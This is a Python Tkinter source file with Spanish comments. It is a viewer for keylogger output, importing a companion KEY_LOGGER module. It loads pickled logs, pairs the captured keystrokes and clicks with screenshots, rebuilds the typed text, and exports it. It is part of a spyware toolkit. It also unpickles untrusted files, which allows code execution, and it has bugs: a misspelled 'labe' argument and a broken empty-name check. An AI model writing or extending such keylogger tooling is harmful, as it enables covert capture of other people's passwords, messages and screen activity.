# PENDIENTE
# OVERFLOW FOTOS


from tkinter import *
from tkinter import filedialog
from tkinter import simpledialog
from tkinter import messagebox

import pickle, sys, os 
from PIL import ImageTk
from KEY_LOGGER import Logger
from PIL import Image


class Log_gui():

	# ----------------------- INTERFAZ ------------------
	def __init__(self):
		root = Tk()
		frame_menu = Menu(root)
		root.config(padx=10, pady=20, menu=frame_menu)

		menu_log = Menu(frame_menu, tearoff=0)
		frame_menu.add_cascade(menu=menu_log, label='Log')
		menu_log.add_command(label='Abrir log', command=self.abrir_log)
		menu_log.add_command(label='Cargar log', command=self.load_data)

		frame_menu.add_command(label='Imprimir todos', command=self.imprimir_datos)
		frame_menu.add_command(label='Ver foto', command=self.ver_foto)
		frame_menu.add_command(labe='Exportar', command=self.exportar)
		frame_menu.add_command(label='Salir', command=self.salir)


		self.frame_principal = Frame(root)
		self.frame_principal.pack()

		self.ruta = StringVar()
		self.ruta.set('Abre un archivo para comenzar')
		label_ruta = Label(self.frame_principal, textvariable=self.ruta, font=15, padx=10, pady=20, width=80)
		label_ruta.pack()
		self.boton_load = Button(self.frame_principal, text='Load data', font=15, relief='groove', bd=0.5, state=DISABLED, command=self.load_data)
		self.boton_load.pack()
		# ---------------------- MAINLOOP -------------------
		root.mainloop()


	# ----------------------- FUNCIONES -----------------

	def abrir_log(self):
		src = filedialog.askopenfilename(title='Abrir log', filetype=[('Log', '*.txt')])
		if src != '':
			self.ruta.set(src)
			if os.path.exists(self.ruta.get()):
				self.boton_load.config(state=NORMAL, relief='ridge')
			else:
				self.ruta.set('Ruta no encontrada')
		else:
			self.ruta.set('Ruta no valida')


	def load_data(self):
		with open(self.ruta.get(), 'rb') as file:
			try:	
				d = file.read()
				self.data = pickle.loads(d).extraer()[1]
				self.boton_load.pack_forget()
				self.mostrar_datos()
			except TypeError:
				self.ruta.set('Archivo no valido')
				self.boton_load.config(relief='groove', state=DISABLED)

	def mostrar_datos(self):

		def procesar_datos():
			resultado = []
			for grupo in self.grupos:
				r_grupo = ''
				for i in grupo[1:]:
					if i == 'Key.space':
						i = ' '
					elif i == 'Key.enter':
						i = ' *ENTER* '
					elif i == 'Key.backspace':
						r_grupo = r_grupo[:-1]
					elif i == 'Key.caps_lock':
						i = ''
					elif i == 'Key.tab':
						i = ' *TAB* '
					elif i == 'Button.left':
						i = ' *CLICK* '

					r_grupo += i
				resultado.append(r_grupo)
			return resultado

		def imprimir_texto(indice, texto):
			if indice.__class__ == int:
				self.actual.set(indice)
			self.textarea.config(state=NORMAL)
			self.textarea.delete(0.0, END)
			self.textarea.insert(0.3, 'GRUPO - ' + str(indice)+'\n\n')
			self.textarea.insert(END, texto)
			self.textarea.config(state=DISABLED)
		

		# FRAME DATOS
		self.frame_mostrardatos = Frame(self.frame_principal)
		self.frame_mostrardatos.pack()

		# FRAME FOTOS/TECLAS
		self.frame_datosfotos = Frame(self.frame_mostrardatos)
		self.frame_datosfotos.config(height=20)
		self.frame_datosfotos.grid(column=1, row=1, padx=5,pady=5)
		self.frame_datosteclas = Frame(self.frame_mostrardatos)
		self.frame_datosteclas.grid(column=2, row=1, padx=5,pady=5)

		lista_fotos = []
		self.grupos = self.agrupar_datos()
		self.actual = IntVar()
		self.datos_procesados = procesar_datos()
		if not os.path.exists('tmp'):
			os.makedirs('tmp')

		for i in range(len(self.grupos)):
			self.grupos[i][0].resize((150,90)).save('tmp/screenshot' + str(i) + '.png', 'png')
			screenshot = PhotoImage(file='tmp/'+'screenshot'+str(i)+'.png')
			boton_foto = Button(self.frame_datosfotos, image=screenshot, relief='solid', bd=1, command=lambda i=i: imprimir_texto(i, self.datos_procesados[i]))
			boton_foto.image = screenshot
			lista_fotos.append(boton_foto)
			boton_foto.grid(row=i%4, column=int(i/4))

		# FRAME TECLAS
		self.textarea = Text(self.frame_datosteclas, state=DISABLED, height=20)
		self.textarea.pack()



	def agrupar_datos(self):
		grupos = []		
		grupo = []
		for log in self.data:
			if log.__class__.__name__ == 'Image':
				if len(grupo) == 0:
					grupo.append(log)
				else:
					grupos.append(grupo)
					grupo = []
					grupo.append(log)
			else:
				grupo.append(log)
		grupos.append(grupo)
		return grupos

	def imprimir_datos(self):
		try:
			self.textarea.config(state=NORMAL)
			self.textarea.delete(0.0, END)
			self.textarea.insert(0.3, 'GENERAL ' +'\n\n')
			self.textarea.insert(END, ''.join(str('\n - '+i) for i in self.data if i.__class__.__name__ != 'Image'))
			self.textarea.config(state=DISABLED)
		except AttributeError:
			print('No data')

		

	def ver_foto(self):
		try:
			self.grupos[self.actual.get()][0].show()
		except:
			pass

	def exportar(self):
		if os.path.exists(self.ruta.get()):
			output = simpledialog.askstring('Nombre del archivo', 'Nombre del archivo donde se guardaran los datos')
			if output != '' or output != None:
				with open('Exportaciones/' + output + '.txt', 'w') as file:
					for i in self.data:
						file.write(str(i)+'\n')

				messagebox.showinfo('GUARDADO','Guardado con exito \'{}\''.format(output))


	def salir(self):
		os.system('rmdir /S /Q tmp')
		sys.exit()

Log_gui()